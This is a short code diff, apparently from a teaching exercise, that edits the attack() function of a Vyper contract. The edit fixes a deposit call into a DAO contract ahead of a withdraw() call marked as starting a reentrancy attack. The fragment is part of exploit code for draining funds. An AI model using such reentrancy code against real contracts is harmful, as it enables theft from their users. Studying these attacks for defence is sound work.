@@ -36,7 +36,7 @@ def attack(dao_address:address):
         deposit_amount = dao_address.balance
     
     # TODO: make the deposit into the DAO  
-    self.dao_contract.deposit() 
+    self.dao_contract.deposit(deposit_amount) 
 
     # TODO: Start the reentrancy attack
     self.dao_contract.withdraw()
